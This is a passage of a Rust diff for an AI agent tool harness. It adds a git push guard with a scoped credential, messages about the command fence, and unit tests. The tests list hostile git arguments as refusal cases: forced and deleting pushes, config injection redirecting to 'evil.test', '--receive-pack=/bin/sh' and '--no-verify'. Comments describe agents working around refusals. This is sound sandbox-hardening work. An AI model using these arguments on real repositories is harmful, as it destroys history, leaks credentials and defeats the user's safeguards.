             Tool::SpawnAgent => r#"{"type":"object","properties":{"name":{"type":"string","description":"Short label for the agent, e.g. 'research-opfs'"},"task":{"type":"string","description":"The complete, self-contained instruction for the agent. It cannot see this conversation, so say everything it needs."}},"required":["name","task"]}"#,
             Tool::WebOpen => r#"{"type":"object","properties":{"url":{"type":"string","description":"Absolute URL of the page to show, including the https:// scheme"}},"required":["url"]}"#,
             Tool::WebClose => r#"{"type":"object","properties":{}}"#,
@@ -3100,7 +4097,7 @@ impl Tool {
                     entries.sort_by(|a, b| a.0.cmp(&b.0));
                     for (name, is_dir, _) in entries.iter().rev() {
                         if *is_dir {
-                            if !opts.all && is_skipped_dir(name) {
+                            if opts.walk.skips(name) {
                                 stats.skipped += 1;
                                 continue;
                             }
@@ -3173,6 +4170,7 @@ impl Tool {
                     if p.is_empty() { String::new() } else { fmt!("{}/", p) }
                 };
                 let all = extract_json_bool(args_json, "all").unwrap_or(false);
+                let walk = Skips::new(all, &[&raw, &pattern]);
                 let limit = uint_arg(args_json, "limit", GLOB_PATHS_MAX, GLOB_PATHS_MAX).max(1);
                 let mut hits: Vec<GlobHit> = Vec::new();
                 let mut skipped = 0usize;
@@ -3187,7 +4185,7 @@ impl Tool {
                     for (name, is_dir, _) in &entries {
                         let child = Self::join_rel(&dir, name);
                         if *is_dir {
-                            if !all && is_skipped_dir(name) {
+                            if walk.skips(name) {
                                 skipped += 1;
                                 continue;
                             }
@@ -3209,7 +4207,7 @@ impl Tool {
                         }
                     }
                 }
-                Ok(Self::glob_output(&pattern, &raw, hits, limit, skipped, refused, false))
+                Ok(Self::glob_output(&pattern, &raw, hits, limit, skipped, refused, walk, false))
             }
             Tool::FileDelete => {
                 let path = res!(Self::scoped(ctx, &res!(Self::arg(args_json, "path"))));
@@ -3666,7 +4664,7 @@ impl Tool {
             // whole walk a repeatable pre-order -- what `offset` needs to page honestly.
             for (name, p, is_dir) in entries.iter().rev() {
                 if *is_dir {
-                    if !opts.all && is_skipped_dir(name) {
+                    if opts.walk.skips(name) {
                         stats.skipped += 1;
                         continue;
                     }
@@ -3735,6 +4733,7 @@ impl Tool {
             "file_glob: 'pattern' is not a glob this build can read."; Invalid, Input)));
         let path = extract_json_string(args, "path").unwrap_or_else(|| ".".to_string());
         let all = extract_json_bool(args, "all").unwrap_or(false);
+        let walk = Skips::new(all, &[&path, &pattern]);
         let limit = uint_arg(args, "limit", GLOB_PATHS_MAX, GLOB_PATHS_MAX).max(1);
         let root = res!(ctx.workspace.resolve(&path));
         let mut hits: Vec<GlobHit> = Vec::new();
@@ -3744,7 +4743,7 @@ impl Tool {
         while let Some(dir) = stack.pop() {
             for (name, p, is_dir) in Self::sorted_entries(&dir) {
                 if is_dir {
-                    if !all && is_skipped_dir(&name) {
+                    if walk.skips(&name) {
                         skipped += 1;
                         continue;
                     }
@@ -3773,7 +4772,7 @@ impl Tool {
                 hits.push(GlobHit { path: rel, when });
             }
         }
-        Ok(Self::glob_output(&pattern, &path, hits, limit, skipped, refused, true))
+        Ok(Self::glob_output(&pattern, &path, hits, limit, skipped, refused, walk, true))
     }
 
     /// Compose a `file_glob` result: the paths, then what the walk did not look in.
@@ -3785,6 +4784,8 @@ impl Tool {
     /// * `limit` - The most paths to report.
     /// * `skipped` - How many directories were passed over by name.
     /// * `refused` - How many paths this turn's bounds put out of reach.
+    /// * `walk` - Which directories this call passed over, and which it walked because it was
+    ///   asked to by name.
     /// * `timed` - Whether the modification times are real, and so worth sorting by.
     fn glob_output(
         pattern:    &str,
@@ -3793,6 +4794,7 @@ impl Tool {
         limit:      usize,
         skipped:    usize,
         refused:    usize,
+        walk:       Skips,
         timed:      bool,
     )
         -> String
@@ -3828,7 +4830,16 @@ impl Tool {
         if skipped > 0 {
             out.push_str(&fmt!(
                 "\n[file_glob] NOT walked: {} director(ies) named {} (pass \"all\":true to \
-                include them).", skipped, SKIP_DIRS.join(", ")));
+                include them, or name one in 'path' or the pattern to walk just that one).",
+                skipped, walk.passed_over().join(", ")));
+        }
+        // Said out loud, because "you asked for .git and this is what is in it" and "there is
+        // nothing here" are the two readings of an empty result, and only one of them is true.
+        let named = walk.by_name();
+        if !named.is_empty() {
+            out.push_str(&fmt!(
+                "\n[file_glob] WALKED by name: {} -- normally passed over, walked here because \
+                you named it.", named.join(", ")));
         }
         if refused > 0 {
             out.push_str(&fmt!(
@@ -3894,7 +4905,10 @@ impl Tool {
     ///    a model that could name environment variables could set `LD_PRELOAD`, or smuggle a
     ///    stolen value out through one. What a command inherits is the user's decision, made once
     ///    when they paired the hand -- and, where they granted a [`Toolkit`], the two or three
-    ///    names that toolkit needs, taken from a table here and never from `argv`.
+    ///    names that toolkit needs, taken from a table here and never from `argv`. The push
+    ///    credential is the same rule applied to a secret: it enters the environment of one
+    ///    command, chosen by [`git_step`] out of what the user set and never out of `argv`, and it
+    ///    is in no other command's environment at all.
     /// 3. **The fence comes from the turn's own bounds** (see [`fence_spec`]), and from nothing
     ///    else. A command reaches exactly the files the same turn's `file_read` would have reached:
     ///    both doors read the one [`ToolContext::no_write`] list, so a Diamond-scoped turn is fenced
@@ -3986,10 +5000,37 @@ impl Tool {
                     "did not say it can fence a command"
                 }));
         }
-        // The Diamond's own directory is where a command belongs unless the model says otherwise
-        // (see `ToolContext::default_cwd`, which is what makes that sentence true for a scoped turn
-        // rather than merely intended).
-        let cwd_rel = extract_json_string(args, "cwd").unwrap_or_else(|| ctx.default_cwd());
+        // The Diamond's first attached folder is where a command belongs unless the model says
+        // otherwise (see `ToolContext::default_cwd`, which is what makes that sentence true for a
+        // scoped turn rather than merely intended).
+        //
+        // A scoped turn that lands on nothing is refused HERE, in the words that describe it. Its
+        // own directory is in the browser's storage and not on this machine, so what it has is no
+        // machine folder rather than a bad one -- and the alternative is the hand's
+        // "cannot be resolved to a directory on this machine", which is true, unhelpful, and points
+        // at a path the user never chose.
+        let cwd_rel = match extract_json_string(args, "cwd") {
+            Some(c) => c,
+            None    => {
+                let d = ctx.default_cwd();
+                if d.is_empty() && ctx.is_scoped() {
+                    return Ok(fmt!(
+                        "Refused: this Diamond has no folder on the machine attached to it, so \
+                        there is nowhere for a command to run. Its own files live in Daimond's \
+                        storage, which is not a place on this computer. Ask the user to attach a \
+                        folder to this Diamond in the Workspace panel, or name a 'cwd' inside one \
+                        that is already attached."));
+                }
+                d
+            }
+        };
+        // Before the bounds, and for the same reason the file tools' check comes first: an
+        // absolute `cwd` normalises into the allow-list check as `home/u/...` and is refused as
+        // out of this Diamond's workspace, which is the wrong problem to hand back. `default_cwd`
+        // normalises, so this only ever fires on a path the model wrote.
+        if cwd_rel.starts_with('/') {
+            return Ok(run_cwd_refusal(&cwd_rel, &root));
+        }
         if !ctx.may_read(&cwd_rel) {
             return Ok(ctx.refusal(&cwd_rel, false));
         }
@@ -4009,6 +5050,15 @@ impl Tool {
                 "Refused: this turn's bounds do not describe any folder the command could run in, \
                 so there is no fence to run it inside. Nothing was run."));
         }
+        // What to do about a `git` command, decided ONCE and in one place. A refusal returns here,
+        // above the consent question, so the user is never asked to approve a push that was going
+        // to be refused; and the credential is attached below out of the same decision, so an
+        // `argv` that did not pass this cannot be authenticated by any later step.
+        let push_env = match git_step(&argv, &root, no_net) {
+            GitStep::Refuse(why) => return Ok(why),
+            GitStep::WithEnv(e)  => e,
+            GitStep::Plain       => Vec::new(),
+        };
         let timeout = extract_json_number(args, "timeout_ms")
             .unwrap_or(Self::RUN_TIMEOUT_DEFAULT_MS)
             .min(Self::RUN_TIMEOUT_MAX_MS);
@@ -4038,10 +5088,16 @@ impl Tool {
         // The environment is still not the model's to set: what goes here is the granted toolkit's
         // own two or three names, from a table in this file, or nothing at all. `argv` never
         // reaches it, so no command can name a variable by asking to be run with one.
-        let env_json = match Kit::resolve(&ctx.no_write, &machine) {
-            Some(kit) => kit.env_json(),
-            None      => fmt!("[]"),
+        //
+        // The push credential joins it here and nowhere else, and it is appended LAST so that a
+        // toolkit variable can never overwrite one of git's: the two name-spaces do not overlap
+        // today, and "today" is not a property worth resting a credential on.
+        let mut env_pairs = match Kit::resolve(&ctx.no_write, &machine) {
+            Some(kit) => kit.env,
+            None      => Vec::new(),
         };
+        env_pairs.extend(push_env);
+        let env_json = env_json_of(&env_pairs);
         // The granted toolkit names travel WITH the fence, because the hand cannot check the one
         // without the other: a fence naming `~/.cargo/registry` is not under the granted root, and
         // a hand that allowed every toolchain folder regardless would accept a writable
@@ -4176,6 +5232,36 @@ impl Tool {
         };
         truncate_output(&mut s, MAX_OUTPUT.saturating_sub(envelope_overhead(&origin) + tail.len()));
         let mut out = fmt!("{}{}", ctx.wrap_untrusted(&origin, &s), tail);
+        // A '~' in `argv` cannot be refused outright -- it is legitimate text to `grep` or to a
+        // commit message -- so it is explained at the only moment it is worth explaining: a
+        // command that failed with one in it. On a success nothing was misread and this would be
+        // noise.
+        if exit > 0 {
+            if let Some(a) = argv.iter().find(|a| a.starts_with("~/") || a.as_str() == "~") {
+                let shown: String = a.chars().take(60).collect();
+                out.push_str(&fmt!(
+                    "\n[the argument '{}' begins with '~', and there is no shell here to expand \
+                    it: the program was handed a directory literally named '~'. If that was meant \
+                    to be a path, write it out in full from '/'.]", shown));
+            }
+        }
+        // The one refusal that looks like a broken command rather than like a rule.
+        //
+        // Every fence denies Daimond's own `.daimond` directory, so a walk of the whole workspace
+        // -- `find`, `du`, `tar`, `grep -r`, `rg --no-ignore` -- meets it, prints "Permission
+        // denied" against that one path, and EXITS NON-ZERO even though every other directory was
+        // read. `find /home/u ...` therefore reads as a failure, and the reason is invisible: the
+        // path is denied, not missing, and nothing in the output says why.
+        //
+        // Said here rather than in the machine briefing because the briefing is paid for on every
+        // request of every turn, and this is worth one line on the few commands that meet it. Both
+        // halves of the test are needed: the directory's name alone appears in any listing of the
+        // workspace, and a denial alone is any of a dozen ordinary failures.
+        if s.contains(DAIMOND_DIR.trim_end_matches('/'))
+            && (s.contains("Permission denied") || s.contains("Operation not permitted"))
+        {
+            out.push_str(DENIED_DIR_NOTE);
+        }
         // Why the build failed, said by the app rather than guessed at by the model.
         //
         // Outside the envelope, because this is Daimond speaking and not the command; and
@@ -4189,6 +5275,21 @@ impl Tool {
         out
     }
 }
+
+/// What a command's result says when a walk met the one directory every fence denies.
+///
+/// Written for the model to act on: it names the cause, says the results are otherwise complete,
+/// says not to treat the exit code as a failure, and says what to do differently.  A walk that
+/// stopped on `.daimond` and reported "Permission denied" is the single most likely way an agent
+/// meets the fence without being told it has.
+#[cfg(any(target_arch = "wasm32", test))]
+const DENIED_DIR_NOTE: &str =
+    "\n[the '.daimond' directory is Daimond's own, and every command is denied it -- that is the \
+    fence working, not a broken permission. A walk of the whole workspace (find, du, tar, grep -r) \
+    reports it and then exits non-zero even though everything else was read, so the results above \
+    are complete apart from that one directory. Do not re-run it with sudo or hunt for the cause: \
+    start the walk lower down, or exclude that directory, and read the non-zero status as this and \
+    not as a failure.]";
 
 /// What a command's result says when the turn ran it with the network refused.
 ///
@@ -4321,13 +5422,16 @@ mod tests {
 
     use oxedyne_fe2o3_jdat::prelude::*;
 
+    /// A tool context on a scratch directory of this call's own.
+    ///
+    /// Under the user cache rather than `std::env::temp_dir()`: `/tmp` is a tmpfs
+    /// here, so a fixture written there is resident memory the test binary never
+    /// gives back -- this helper alone left 27,281 directories behind.
     fn ctx() -> ToolContext {
-        let mut dir = std::env::temp_dir();
-        let n = std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .map(|d| d.as_nanos())
-            .unwrap_or(0);
-        dir.push(fmt!("daimond_tools_test_{}", n));
+        let dir = match oxedyne_fe2o3_test::scratch::scratch_dir("daimond_tools_test") {
+            Ok(d)  => d,
+            Err(e) => panic!("a scratch directory: {}", e),
+        };
         let ws = Workspace::new(dir).expect("ws");
         ToolContext { workspace: ws, executor: Executor::local_default(), cwd: String::new(), path_prefix: String::new(), root: FileRoot::Workspace, read_seen: new_read_cache(), no_write: Vec::new() }
     }
@@ -4859,6 +5963,32 @@ mod tests {
     }
 
     #[test]
+    fn test_only_daimonds_own_store_is_store_state_00() {
+        // The seam between the two roots, and the whole of it. A path under the store resolves to
+        // the sandbox whatever root is active; everything else follows the folder. Both halves are
+        // the test: a rule that answered yes too often would pin the user's project to the sandbox
+        // and break real-folder mode outright, which is the over-correction, not a fix.
+        assert!(is_store_path("diamonds"), "the store's own root");
+        assert!(is_store_path("diamonds/x/crystal.md"));
+        assert!(is_store_path("./diamonds/x/../x/crystal.md"), "normalised before it is measured");
+        // The roots the store had before the noun moved. A workspace not opened since the rename
+        // still holds one, and it is Daimond's state either way.
+        assert!(is_store_path("foci/x/crystal.md"));
+        assert!(is_store_path("facets/x/crystal.md"));
+        // Whole segments, never a substring: these are the user's.
+        assert!(!is_store_path("diamonds-old/keep.md"));
+        assert!(!is_store_path("src/diamonds/keep.md"));
+        assert!(!is_store_path("mydiamonds"));
+        // The root itself is the WORK's root: `under(p, "")` is true of every path, so an
+        // unguarded empty string would make the panel list the sandbox with a folder open.
+        assert!(!is_store_path(""), "the workspace root is the user's, not the store's");
+        assert!(!is_store_path("."));
+        assert!(!is_store_path("/"));
+        // A path that climbs out of the store is not in it.
+        assert!(!is_store_path("diamonds/a/../../etc/x"));
+    }
+
+    #[test]
     fn test_a_scoped_turn_has_somewhere_to_run_a_command_00() {
         // `Tool::run` defaults `cwd` to the directory this returns, and then checks it against the
         // turn's own bounds. A scoped worker carries no `path_prefix` -- its model writes whole
@@ -4871,14 +6001,30 @@ mod tests {
         assert!(!cwd.is_empty(), "a scoped turn must have a directory to start in");
         assert!(c.may_read(&cwd),
             "and it must be one the turn may reach, or every command is refused: cwd={:?}", cwd);
-        assert_eq!(cwd, fmt!("diamonds/d1"), "the Diamond's own directory, which is always in scope");
-        // A prefixed turn keeps its prefix: the daimon addresses `crystal.md` and means
-        // `diamonds/<id>/crystal.md`, and its commands belong in the same place.
+        // The Diamond's ATTACHED folder, not the Diamond's own directory. Its own directory is in
+        // the browser's storage whatever workspace root is open (see `is_store_path`), so
+        // `<granted-root>/diamonds/d1` is a path the hand cannot canonicalise and every command
+        // would be refused for a reason pointing at the wrong thing.
+        assert_eq!(cwd, fmt!("notes"), "the first place the Diamond has ON THE MACHINE");
+        // A read-only attachment is still somewhere to start: a command may be run there, and the
+        // fence is what stops it writing.
+        assert_eq!(scoped(&[], &["refs"]).default_cwd(), fmt!("refs"));
+        // With nothing attached there is nowhere on the machine at all, and the turn is still
+        // SCOPED -- which is how `Tool::Run` tells this apart from an ordinary turn, whose empty
+        // cwd rightly means the workspace root.
+        let bare = scoped(&[], &[]);
+        assert_eq!(bare.default_cwd(), fmt!(""), "a Diamond's own directory is not on the machine");
+        assert!(bare.is_scoped(), "and the turn is still scoped, so `run` refuses in those words");
+        // A prefixed turn keeps its prefix, unless the prefix is the store -- which the crystal
+        // agent's is, and it has no machine directory either.
         let mut d = ctx();
+        d.path_prefix = fmt!("src/api");
+        assert_eq!(d.default_cwd(), fmt!("src/api"));
         d.path_prefix = fmt!("diamonds/d2");
-        assert_eq!(d.default_cwd(), fmt!("diamonds/d2"));
-        // And an ordinary turn still starts at the workspace root.
+        assert_eq!(d.default_cwd(), fmt!(""));
+        // And an ordinary turn still starts at the workspace root, and is not scoped.
         assert_eq!(ctx().default_cwd(), fmt!(""));
+        assert!(!ctx().is_scoped());
     }
 
     #[test]
@@ -5990,6 +7136,116 @@ mod tests {
         assert!(out.contains("outside the fence"), "{}", out);
     }
 
+    // ── Three path conventions, each said where it is met ────────────────────
+    //
+    // The file tools are workspace-relative, `run`'s `argv` is the machine's own, and `run`'s
+    // `cwd` is workspace-relative again. Nothing told the model so, and none of the three failures
+    // named the convention or the fix: an absolute `file_read` came back "OPFS: open dir 'home'
+    // failed", an absolute `cwd` came back about a doubled path, and a '~' in `argv` came back as
+    // whatever the program says about a directory it cannot find. A turn went on each of them, in
+    // session after session.
+
+    /// An absolute path to a file tool is refused, and the refusal carries the whole of the repair:
+    /// which tool, which path, the folder it would otherwise have been hunted in, and what to write
+    /// instead.
+    #[test]
+    fn test_an_absolute_path_to_a_file_tool_names_the_convention_00() {
+        let c = ctx();
+        let cases: Vec<(Tool, String)> = vec![
+            (Tool::FileRead,    fmt!(r#"{{"path":"/home/you/project/src/main.rs"}}"#)),
+            (Tool::FileWrite,   fmt!(r#"{{"path":"/home/you/project/a.txt","content":"x"}}"#)),
+            (Tool::FileList,    fmt!(r#"{{"path":"/home/you/project"}}"#)),
+            (Tool::ArtefactAdd, fmt!(r#"{{"path":"/home/you/project/a.txt"}}"#)),
+        ];
+        for (tool, args) in &cases {
+            let out = tool.guard(args, &c).expect("guard")
+                .unwrap_or_else(|| panic!("{} accepted an absolute path", tool.name()));
+            assert!(out.contains("/home/you/project"),
+                "the refusal must quote what was asked for: {}", out);
+            assert!(out.contains(tool.name()),
+                "and name the tool whose convention it is: {}", out);
+            assert!(out.contains("relative to the workspace"),
+                "and say what the convention IS: {}", out);
+            assert!(out.contains("'home'"),
+                "and name the folder it would have been hunted in, which is the 'open dir' \
+                message the model has already seen: {}", out);
+            assert!(out.contains("argv"),
+                "and say where an absolute path DOES belong, or the model has nowhere to put \
+                one: {}", out);
+        }
+        // The refusal reaches the model as a result and the write does not happen -- a guard that
+        // wrote the file first and complained afterwards would be no guard.
+        let w = Tool::FileWrite.execute_sync_guarded(
+            r#"{"path":"/home/you/project/a.txt","content":"x"}"#, &c).expect("write");
+        assert!(w.starts_with("Refused:"), "{}", w);
+        assert!(Tool::FileRead.execute_sync(r#"{"path":"home/you/project/a.txt"}"#, &c).is_err(),
+            "the absolute path was written as folders inside the workspace after all");
+        // The control, and the half a refusal cannot cover for: ordinary relative work is
+        // untouched, so a "fix" that refused every path could not pass this.
+        Tool::FileWrite.execute_sync_guarded(r#"{"path":"a.txt","content":"x"}"#, &c)
+            .expect("a relative write must still work");
+        assert_eq!("1\tx\n",
+            Tool::FileRead.execute_sync_guarded(r#"{"path":"a.txt"}"#, &c).expect("read"));
+    }
+
+    /// An absolute `cwd` is refused with the doubled path it would have become and, where the
+    /// answer is computable, the exact string to send instead.
+    #[test]
+    fn test_an_absolute_cwd_is_refused_with_the_relative_form_00() {
+        let root = "/home/you/proj";
+        let out = run_cwd_refusal("/home/you/proj/src/api", root);
+        assert!(out.contains("/home/you/proj/home/you/proj/src/api"),
+            "the refusal must show where it would have landed, which is the sentence the hand \
+            sent back: {}", out);
+        assert!(out.contains("Pass 'src/api' instead."),
+            "and hand over the corrected value, since the root is known here: {}", out);
+        assert!(out.contains("argv"), "and say which side takes an absolute path: {}", out);
+
+        // The granted folder itself is not "src of nothing": it is the default.
+        assert!(run_cwd_refusal("/home/you/proj", root).contains("leave 'cwd' out"),
+            "{}", run_cwd_refusal("/home/you/proj", root));
+
+        // Outside the grant there is no relative form, and inventing one would send the model
+        // somewhere it cannot run either.
+        let outside = run_cwd_refusal("/etc", root);
+        assert!(!outside.contains("Pass '"), "a path outside the grant was 'corrected': {}", outside);
+        assert!(outside.contains("/home/you/proj"), "and the grant must be named: {}", outside);
+
+        // A sibling whose name merely BEGINS with the root's is not inside it -- the same
+        // whole-segment rule `under` exists for, arriving from the other side.
+        let sibling = run_cwd_refusal("/home/you/proj2/src", root);
+        assert!(!sibling.contains("Pass '"),
+            "'/home/you/proj2/src' was read as inside '/home/you/proj': {}", sibling);
+    }
+
+    /// A '~' in `argv` is explained on the failure it causes, and nowhere else.
+    ///
+    /// It cannot be refused outright: '~/' is legitimate text to `rg`, to `sed` and to a commit
+    /// message, and a tool that refused it would block work no one can do another way.
+    #[test]
+    fn test_a_tilde_in_argv_is_explained_on_the_failure_it_causes_00() {
+        let argv = vec![fmt!("rg"), fmt!("-n"), fmt!("pattern"), fmt!("~/usr/code")];
+        let failed = Tool::run_result(&argv,
+            r#"{"stdout":"","stderr":"rg: ~/usr/code: No such file or directory","exit":2}"#,
+            &ctx(), false);
+        assert!(failed.contains("the argument '~/usr/code' begins with '~'"),
+            "a failed command with a tilde in it was not explained: {}", failed);
+        assert!(failed.contains("no shell here to expand it"),
+            "and the reason must be in the same sentence: {}", failed);
+
+        // Not on a success: nothing was misread, and a line the model learns to skip is worse than
+        // no line at all.
+        let ok = Tool::run_result(&argv, r#"{"stdout":"a match","exit":0}"#, &ctx(), false);
+        assert!(!ok.contains("no shell here to expand it"),
+            "the note appeared on a command that worked: {}", ok);
+
+        // Nor on a failure that had no tilde in it, or it explains the wrong thing.
+        let other = Tool::run_result(&vec![fmt!("cargo"), fmt!("test")],
+            r#"{"stdout":"","stderr":"error[E0308]","exit":101}"#, &ctx(), false);
+        assert!(!other.contains("no shell here to expand it"),
+            "an unrelated failure was blamed on a tilde: {}", other);
+    }
+
     /// A dispatched task derives from whatever the conductor read, and the transcript should say
     /// so where it did read a stranger.
     #[test]
@@ -6566,8 +7822,29 @@ mod tests {
                         (Some(p), Some(n)) => Some(fmt!("{}:{}", p, n)), _ => None } })
                 .collect();
             want.sort();
-            let got = search_says(&c, &fmt!(
-                r#"{{"query":"{}","path":"src","limit":1000,"all":true}}"#, json_escape(pattern)));
+            // Paged, because the crate is bigger than one page of matches and a single call
+            // stops at `SEARCH_MATCHES_MAX`. Comparing a capped page against the whole of grep
+            // would fail as the crate grows, and comparing a PREFIX of it would compare two
+            // different orders -- so every page is taken and the union compared, which exercises
+            // `offset` against the oracle at the same time.
+            let mut got: Vec<String> = Vec::new();
+            let mut offset = 0usize;
+            loop {
+                let page = search_says(&c, &fmt!(
+                    r#"{{"query":"{}","path":"src","limit":{},"offset":{},"all":true}}"#,
+                    json_escape(pattern), SEARCH_MATCHES_MAX, offset));
+                let n = page.len();
+                got.extend(page);
+                if n < SEARCH_MATCHES_MAX {
+                    break;
+                }
+                offset += SEARCH_MATCHES_MAX;
+                assert!(offset < 100_000, "'{}' pages without end", pattern);
+            }
+            got.sort();
+            got.dedup();
+            let mut want = want;
+            want.dedup();
             assert!(!want.is_empty(), "'{}' matches nothing, so it proves nothing", pattern);
             assert_eq!(want, got, "file_search and grep disagree on '{}'", pattern);
         }
@@ -7310,6 +8587,620 @@ mod tests {
             assert_eq!(p, Tool::scoped(&c, p).expect("no prefix means pass-through"),
                 "an unprefixed turn's path must not be rewritten: {:?}", p);
         }
+    }
+
+    // ── Pushing: the guard, and the credential it gates ──────────────
+    //
+    // Every refusal below is written as a PAIR: a spelling that must get through and a spelling
+    // that must not.  A guard tested only on the thing it refuses is a guard that would still pass
+    // if it refused everything, and a guard tested only on what it permits is one that would pass
+    // if it permitted everything.
+
+    /// The guard's verdict, as one word, so a table of cases reads as a table.
+    fn verdict(argv: &[&str]) -> &'static str {
+        let v: Vec<String> = argv.iter().map(|a| a.to_string()).collect();
+        match git_guard(&v) {
+            GitCall::Push      => "push",
+            GitCall::Other     => "other",
+            GitCall::Refuse(_) => "refused",
+        }
+    }
+
+    /// Why the guard refused, for the cases where the sentence itself is the check.
+    fn why(argv: &[&str]) -> String {
+        let v: Vec<String> = argv.iter().map(|a| a.to_string()).collect();
+        match git_guard(&v) {
+            GitCall::Refuse(s) => s,
+            other              => panic!("expected a refusal, got {:?}", other),
+        }
+    }
+
+    /// **Forcing is refused in every spelling git has for it.**
+    ///
+    /// The list is not decoration.  `-f` is the one a model reaches for, `--force-with-lease` is
+    /// the one it reaches for when `-f` is refused and reads as the safe alternative -- it is not:
+    /// it still overwrites, it merely checks first -- and `+main:main` is the one that does not
+    /// look like an option at all.  A guard that caught only `--force` would leave three doors.
+    #[test]
+    fn test_every_spelling_of_a_forced_push_is_refused() {
+        for argv in [
+            vec!["git", "push", "--force"],
+            vec!["git", "push", "-f"],
+            vec!["git", "push", "--force", "origin", "main"],
+            vec!["git", "push", "--force-with-lease"],
+            vec!["git", "push", "--force-with-lease=main"],
+            vec!["git", "push", "--force-if-includes", "origin", "main"],
+            vec!["git", "push", "origin", "+main:main"],
+            vec!["git", "push", "origin", "+refs/heads/main:refs/heads/main"],
+            // After `--`, where option parsing has stopped and the refspec has not.
+            vec!["git", "push", "origin", "--", "+main"],
+            // The program named in full, which is how a model writes it when a bare name failed.
+            vec!["/usr/bin/git", "push", "--force"],
+        ] {
+            assert_eq!("refused", verdict(&argv), "a forced push got through: {:?}", argv);
+        }
+        // And clusters, which is where a guard that compared whole arguments fails: `-uf` is
+        // `-u -f` and every letter after the dash counts.
+        for argv in [
+            vec!["git", "push", "-uf", "origin", "main"],
+            vec!["git", "push", "-fq"],
+            vec!["git", "push", "-qfu", "origin", "main"],
+        ] {
+            assert_eq!("refused", verdict(&argv), "a clustered force got through: {:?}", argv);
+            assert!(why(&argv).contains("'-f'"),
+                "the refusal must name the LETTER, or the model tries '-u -f' next: {:?}", argv);
+        }
+    }
+
+    /// **Deleting a remote ref is refused in both of its spellings.**
+    ///
+    /// `--delete` and an empty source side are the same request, and the second does not look like
+    /// one: `git push origin :main` is three ordinary-looking words.
+    #[test]
+    fn test_every_spelling_of_a_remote_delete_is_refused() {
+        for argv in [
+            vec!["git", "push", "--delete", "origin", "main"],
+            vec!["git", "push", "-d", "origin", "main"],
+            vec!["git", "push", "origin", ":main"],
+            vec!["git", "push", "origin", ":refs/heads/main"],
+            vec!["git", "push", "--mirror", "origin"],
+            vec!["git", "push", "--prune", "origin", "main"],
+        ] {
+            assert_eq!("refused", verdict(&argv), "a destructive push got through: {:?}", argv);
+        }
+    }
+
+    /// **An ordinary push is not refused**, which is the half that stops the guard being a wall.
+    ///
+    /// `-n` is here on purpose: it is `--dry-run` on a push and `--no-verify` on a commit, so a
+    /// guard that refused it everywhere would refuse the safest command in the list.
+    #[test]
+    fn test_an_ordinary_fast_forward_push_gets_through() {
+        for argv in [
+            vec!["git", "push"],
+            vec!["git", "push", "origin"],
+            vec!["git", "push", "origin", "main"],
+            vec!["git", "push", "-u", "origin", "main"],
+            vec!["git", "push", "--tags", "origin"],
+            vec!["git", "push", "--follow-tags", "origin", "main"],
+            vec!["git", "push", "-n", "origin", "main"],
+            vec!["git", "push", "--dry-run", "origin", "main"],
+            vec!["git", "push", "--atomic", "origin", "main"],
+            vec!["git", "push", "origin", "HEAD:refs/heads/main"],
+            // `--no-force-with-lease` turns forcing OFF, and a guard matching by prefix would
+            // refuse it for containing the word.
+            vec!["git", "push", "--no-force-with-lease", "origin", "main"],
+            // A push option's VALUE must not be read as the remote.
+            vec!["git", "push", "-o", "ci.skip", "origin", "main"],
+            vec!["git", "push", "--push-option", "ci.skip", "origin", "main"],
+            vec!["git", "push", "--push-option=ci.skip", "origin", "main"],
+            // Git's own options that only ever name a repository.
+            vec!["git", "-C", "sub", "push", "origin", "main"],
+            vec!["git", "--no-pager", "push", "origin", "main"],
+        ] {
+            assert_eq!("push", verdict(&argv), "an ordinary push was refused: {:?}", argv);
+        }
+    }
+
+    /// **Only `origin`.**
+    ///
+    /// The rule is cheap and the reason is structural: the credential is scoped to one host, so a
+    /// push aimed elsewhere would not authenticate anyway.  Saying it here turns a confusing
+    /// authentication failure into a sentence a model can act on.
+    #[test]
+    fn test_a_push_to_anywhere_but_origin_is_refused() {
+        for argv in [
+            vec!["git", "push", "upstream", "main"],
+            vec!["git", "push", "fork", "main"],
+            vec!["git", "push", "https://github.com/o/r.git", "main"],
+            vec!["git", "push", "git@github.com:o/r.git", "main"],
+            vec!["git", "push", "ssh://git@github.com/o/r", "main"],
+            vec!["git", "push", "/srv/mirror.git", "main"],
+            vec!["git", "push", "../other", "main"],
+        ] {
+            assert_eq!("refused", verdict(&argv), "a push to a stranger got through: {:?}", argv);
+        }
+        // A URL says a different thing from a remote name, and gets a different sentence: one is
+        // "use origin", the other is "that is not a remote at all".
+        assert!(why(&["git", "push", "https://github.com/o/r.git", "main"])
+            .contains("names a repository directly"));
+        assert!(why(&["git", "push", "upstream", "main"]).contains("only to 'origin'"));
+    }
+
+    /// **Configuration is the app's on a push**, because configuration is what carries the
+    /// credential: which host it goes to, which protocols are allowed, whether a program in the
+    /// repository runs.
+    #[test]
+    fn test_config_injection_before_a_push_is_refused() {
+        for argv in [
+            vec!["git", "-c", "http.extraHeader=Authorization: Basic x", "push", "origin", "main"],
+            // Stuck to the option, which is also git.
+            vec!["git", "-chttp.extraHeader=x", "push", "origin", "main"],
+            vec!["git", "-c", "url.https://evil.test/.insteadOf=https://github.com/",
+                "push", "origin", "main"],
+            vec!["git", "--config-env=http.extraHeader=X", "push", "origin", "main"],
+            vec!["git", "--exec-path=/tmp/evil", "push", "origin", "main"],
+            // The far end's program, named by the near end.
+            vec!["git", "push", "--receive-pack=/bin/sh", "origin", "main"],
+            vec!["git", "push", "--exec", "/bin/sh", "origin", "main"],
+            vec!["git", "push", "--repo=https://evil.test/x", "origin", "main"],
+        ] {
+            assert_eq!("refused", verdict(&argv), "a config injection got through: {:?}", argv);
+        }
+        // `-C` is not `-c`, and case is the whole difference. Refusing it would stop every push
+        // from a subdirectory.
+        assert_eq!("push", verdict(&["git", "-C", "sub", "push", "origin", "main"]));
+    }
+
+    /// **`--no-verify` is refused, and the refusal carries its reason.**
+    ///
+    /// The reason is not decoration either: this user has a global `pre-commit` hook that reads
+    /// every staged line looking for a credential, and it exists because a key reached a public
+    /// repository once and a stranger was using it nine days later.  A model told only "refused"
+    /// will look for the next way round; a model told why will fix what the hook caught.
+    #[test]
+    fn test_skipping_the_hooks_is_refused_on_the_commands_that_have_hooks() {
+        for argv in [
+            vec!["git", "commit", "--no-verify", "-m", "wip"],
+            vec!["git", "commit", "-n", "-m", "wip"],
+            vec!["git", "commit", "-an", "-m", "wip"],       // clustered
+            vec!["git", "commit", "-nm", "wip"],
+            vec!["git", "push", "--no-verify", "origin", "main"],
+            vec!["git", "-C", "sub", "commit", "--no-verify", "-m", "wip"],
